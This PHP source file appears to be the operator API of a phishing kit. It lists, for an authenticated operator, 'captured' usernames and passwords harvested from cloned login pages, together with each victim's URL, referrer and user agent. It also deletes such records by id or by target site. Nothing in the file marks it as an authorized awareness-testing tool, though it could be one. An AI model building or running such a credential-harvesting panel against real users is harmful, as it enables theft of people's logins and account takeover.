<?php
/**
 * api/credentials.php — operator-facing captured-credentials index.
 *
 *   GET  api/credentials.php                          → list every CRED event
 *   POST api/credentials.php  action=delete  id=…     → drop one event by DB id
 *   POST api/credentials.php  action=delete_all slug=… → drop every CRED event for slug
 */

require_once __DIR__ . '/../auth.php';
require_once __DIR__ . '/../lib/cloner.php';
require_once __DIR__ . '/../lib/store.php';

auth_boot();
header('Content-Type: application/json');

if (auth_user() === null) {
    http_response_code(401);
    echo json_encode(['ok' => false, 'error' => 'Not authenticated.']);
    exit;
}

function reply(int $code, array $payload): void {
    http_response_code($code);
    echo json_encode($payload);
    exit;
}

/* ------------------------------------------------------------------ *
 *  GET — list.
 * ------------------------------------------------------------------ */
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    $rows = store_event_list(null, 'cred');
    $items = [];
    foreach ($rows as $row) {
        $p = $row['payload'];
        $username = '';
        foreach (['username', 'user', 'email', 'login', 'inp-username', 'name'] as $k) {
            if (!empty($p[$k])) { $username = (string) $p[$k]; break; }
        }
        $password = '';
        foreach (['password', 'pass', 'passwd', 'inp-password'] as $k) {
            if (!empty($p[$k])) { $password = (string) $p[$k]; break; }
        }

        $items[] = [
            'id'       => $row['id'],
            'target'   => $row['target_slug'],
            'ts'       => $row['captured_at'],
            'username' => $username,
            'password' => $password,
            'url'      => $p['_url'] ?? '',
            'referrer' => $p['_referrer'] ?? '',
            'ua'       => $p['_ua'] ?? '',
            'fields'   => array_filter($p, fn($k) => !str_starts_with($k, '_'), ARRAY_FILTER_USE_KEY),
        ];
    }

    $sources = [];
    foreach ($items as $it) $sources[$it['target']] = true;

    reply(200, [
        'ok'      => true,
        'count'   => count($items),
        'sources' => count($sources),
        'items'   => $items,
    ]);
}

/* ------------------------------------------------------------------ *
 *  POST — delete.
 * ------------------------------------------------------------------ */
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? '';

    if ($action === 'delete') {
        $id = (int) ($_POST['id'] ?? 0);
        if ($id <= 0) {
            reply(400, ['ok' => false, 'error' => 'Bad event id.']);
        }
        $ok = store_event_delete($id);
        reply(200, ['ok' => true, 'deleted' => $ok ? 1 : 0]);
    }

    if ($action === 'delete_all') {
        $slug = strtolower(trim((string) ($_POST['slug'] ?? '')));
        if (!cloner_valid_slug($slug)) {
            reply(400, ['ok' => false, 'error' => 'Invalid slug.']);
        }
        $deleted = store_event_delete_by_kind($slug, 'cred');
        reply(200, ['ok' => true, 'deleted' => $deleted]);
    }

    reply(400, ['ok' => false, 'error' => 'Unknown action.']);
}

reply(405, ['ok' => false, 'error' => 'Method not allowed.']);
